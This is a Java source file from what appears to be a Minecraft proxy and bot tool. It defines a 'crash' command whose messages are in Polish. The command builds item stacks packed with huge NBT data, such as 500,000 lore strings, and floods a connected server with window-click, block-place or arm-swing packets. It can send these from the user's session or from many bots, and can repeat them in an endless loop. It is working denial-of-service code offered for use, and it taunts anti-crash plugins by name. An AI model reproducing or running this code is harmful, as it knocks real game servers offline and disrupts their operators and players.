package xyz.yooniks.cproxy.command.commands;

import org.spacehq.mc.protocol.data.game.ItemStack;
import org.spacehq.mc.protocol.data.game.Position;
import org.spacehq.mc.protocol.data.game.values.Face;
import org.spacehq.mc.protocol.data.game.values.window.ClickItemParam;
import org.spacehq.mc.protocol.data.game.values.window.WindowAction;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerPlaceBlockPacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientSwingArmPacket;
import org.spacehq.mc.protocol.packet.ingame.client.window.ClientWindowActionPacket;
import org.spacehq.opennbt.tag.builtin.*;
import org.spacehq.packetlib.packet.Packet;
import xyz.yooniks.cproxy.command.Command;
import xyz.yooniks.cproxy.enums.CrashType;
import xyz.yooniks.cproxy.enums.Group;
import xyz.yooniks.cproxy.objects.Bot;
import xyz.yooniks.cproxy.objects.Player;

import java.util.ArrayList;
import java.util.List;

public class CrashCommand extends Command {

    private ItemStack isBeacon;
    private ItemStack isBook;
    private ItemStack isByte;

    public CrashCommand() {
        super("crash", "Zlaguj serwer!", ",crash [ilosc pakietow] [boty/gracz-true/false] [infinite-true/false] [odstep w sek] &a[&atype&a (swingarm,windowclick,blockplace) [item: beacon/book] ",
                Group.GRACZ, "krasz", "lag");

        if (true) {
            final CompoundTag nbtB = new CompoundTag("display");
            final List<Tag> tagsB = new ArrayList<>();
            //for (int i = 0; i < 400000; i++)
            for (int i = 0; i < 500000; i++)
                tagsB.add(new StringTag("-________- jebac xprotector"));
            final ListTag listTagB = new ListTag("Lore", tagsB);
            isBeacon = new ItemStack(137, 64, 0, nbtB);
            isBeacon.getNBT().put(listTagB);
        }

        if (true) {
            final CompoundTag nbt = new CompoundTag("ench");
            final List<Tag> tags = new ArrayList<>();
            for (int i = 0; i < 10000; i++)
                tags.add(new StringTag("-________- jebac antycrasherki"));
            final ListTag listTag = new ListTag("pages", tags);
            isBook = new ItemStack(386, 64, 0, nbt);
            isBook.getNBT().put(listTag);
        }
        if (true){
            final CompoundTag nbt= new CompoundTag("ench");
            final List<Tag> tags = new ArrayList<>();
            for (int i = 0; i < 20000; i++)
                tags.add(new ByteTag("END"));
            final ListTag listTag = new ListTag("END", tags);
            isByte= new ItemStack(386, 64, 0, nbt);
            isByte.getNBT().put(listTag);
        }
    }

    @Override
    public void onCommand(Player p, Command command, String[] args) {

        //testy
        if (args.length == 2){
            if (p.getSessionConnect()!=null){
                p.sendMessage("$p &aWysylam...");
                final int am = Integer.parseInt(args[1]);
                for (int i = 0; i < am; i++)
                    p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, isByte,
                            WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
            }
            else{
                p.sendMessage("$p &cNie jestes polaczony z zadnym serwerem!");
            }
            return;
        }

        if (args.length == 0 || args.length < 7) {
            p.sendMessage("$p &7Poprawne uzycie: &a" + getUsage());
            return;
        } else {
            if (!p.isConnected()) {
                p.sendMessage("$p &cNie jestes polaczony z serwerem!");
                return;
            }
            final Integer packets = Integer.parseInt(args[1]);
            final Boolean bots = Boolean.parseBoolean(args[2]);
            final Boolean infinite = Boolean.parseBoolean(args[3]);
            final int seconds = Integer.parseInt(args[4]);
            final String item = args[6];
            final CrashType crashType;
            if (args[5].contains("swingarm") || args[5].contains("armanimation")){
                crashType=CrashType.SWINGARM;
            }
            else if (args[5].contains("windowclick") || args[5].contains("window")){
                crashType=CrashType.WINDOW;
            }
            else if (args[5].contains("place")||args[5].contains("blockplace")){
                crashType=CrashType.PLACE;
            }
            else{
                p.sendMessage("$p &cNieodpowiedni typ crashera. Typy crashera: &7swingarm, windowclick, blockplace");
                return;
            }
            if (bots) {
                if (p.getBots().size() < 1) {
                    p.sendMessage("$p &cNie masz zadnych botow!");
                    return;
                }
            }

            p.sendMessage("$p &7Proba crashowania metoda &a"+(crashType==CrashType.SWINGARM?"ArmAnimation":"NBT")
                    +"&7, &7ilosc pakietow: &a" + args[1] + "&7, sesje: &a" + (bots ? "boty" : "gracz"));
            if (infinite) {

                final Thread t = new Thread(new Runnable() {
                    final String s = args[6];
                    @Override
                    public void run() {
                        final Packet packet;
                        if (crashType == CrashType.PLACE)
                            packet = new ClientPlayerPlaceBlockPacket(new Position(
                                    p.getPosition().getX(),p.getPosition().getY(),p.getPosition().getZ()), Face.NORTH,(s.contains("beacon")||s.contains("none")?isBeacon:isBook),1.0F,
                                    1.0F,1.0F);
                        else if (crashType == CrashType.WINDOW)
                            packet = new ClientWindowActionPacket(0, 1, 1, (s.contains("beacon")||s.contains("none")?isBeacon:isBook),
                                    WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK);
                        else
                            packet = new ClientSwingArmPacket();

                        while (true) {
                            if (bots) {
                                if (p.isStopCrashBot()){
                                    p.setStopCrashBot(false);
                                    p.sendMessage("$p &cPrzerywanie crashowania (botow)..");
                                    Thread.currentThread().stop();
                                    return;
                                }
                                crashBots(p, packets, packet);
                            }
                            else {
                                if (p.getSessionConnect() == null || !p.isConnected() || p.isStopCrash()) {
                                    p.sendMessage("$p &cPrzerywanie crashowania..");
                                    p.setStopCrash(false);
                                    Thread.currentThread().stop();
                                    return;
                                }
                                p.sendMessage("$p &aCrashing..");
                                crash(p, packets, packet);
                            }

                            try {
                                Thread.sleep(1000L * seconds);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                });
                t.start();
            } else {
                Packet packet;

                if (crashType == CrashType.PLACE)
                    packet = new ClientPlayerPlaceBlockPacket(new Position(
                            p.getPosition().getX(),p.getPosition().getY(),p.getPosition().getZ()), Face.NORTH,(item.contains("beacon")||item.contains("none")?isBeacon:isBook),1.0F,
                            1.0F,1.0F);
                else if (crashType == CrashType.WINDOW) {
                    packet = new ClientWindowActionPacket(0, 1, 1, (item.contains("beacon")||item.contains("none")?isBeacon:isBook),
                            WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK);
                }
                else
                    packet = new ClientSwingArmPacket();

                if (bots)
                    crashBots(p, packets,packet);
                else
                    crash(p, packets,packet);
            }
        }
    }

    private void crash(Player p, Integer packets,Packet packet) {
        for (int i = 0; i < packets; i++) {
            if (!p.isConnected() || p.getSessionConnect() == null || p.isStopCrash()) break;
            //p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, is,
             //       WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
            p.getSessionConnect().send(packet);
        }
    }

    private void crashBots(Player p, Integer packets, Packet packet) {
        for (int i = 0; i < packets; i++) {
            if (p.isStopCrashBot())
                break;
            for (Bot bot : p.getBots()) {
                //bot.getSession().send(new ClientWindowActionPacket(0, 1, 1, is,
                //        WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
                bot.getSession().send(packet);
            }
        }
    }

}